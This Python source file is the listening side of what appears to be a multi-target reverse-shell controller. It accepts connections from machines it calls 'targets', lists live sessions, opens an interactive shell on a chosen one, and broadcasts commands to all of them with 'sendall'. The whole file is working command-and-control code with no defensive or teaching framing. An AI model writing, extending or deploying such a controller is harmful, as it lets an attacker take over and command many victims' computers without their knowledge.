#!/usr/bin/python

import socket
import json
import struct
import utils
import os
import base64
import readline
import threading


ips = []
targets = []
clients = 0
stop_threads = False

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 11221))
s.listen(5)
print("Listening for connections ")


def server():
    global s
    global ips
    global targets
    global clients
    while not stop_threads:
        s.settimeout(1)
        try:
            target, ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print(f"\nConnection established from {ip}")
            clients += 1
        except Exception as e:
            pass


t1 = threading.Thread(target=server)
t1.start()

while True:
    command = input("CENTER ~ ")
    if command == "targets":
        closed_targets = []
        closed_ips = []
        for i in range(len(targets)):
            target_socket = targets[i]
            target_ip = ips[i]
            try:
                utils.reliable_send(target_socket, "q")
            except:
                closed_targets.append(target_socket)
                closed_ips.append(target_ip)
        targets = [e for e in targets if e not in closed_targets]
        ips = [e for e in ips if e not in closed_ips]
        for i in range(len(targets)):
            print(f"Session {i} --  {ips[i]}")

    if command[:7] == "session":
        try:
            num = int(command[8:])
            target_socket = targets[num]
            target_ip = ips[num]
            utils.start_shell(target_socket, target_ip)
        except Exception as e:
            print("Invalid session number!")
    if command[:7] == "sendall":
        targets_len = len(targets)
        for i in range(0, targets_len):
            target_socket = targets[i]
            target_ip = ips[i]
            utils.reliable_send(target_socket, command)
            print(f"Sent '{command[8:]}' to {target_ip}")
    if command == "help":
        print(utils.help_message)
    if command == "exit":
        for target in targets:
            utils.reliable_send(target, "close")
        s.close()
        stop_threads = True
        t1.join()
        break
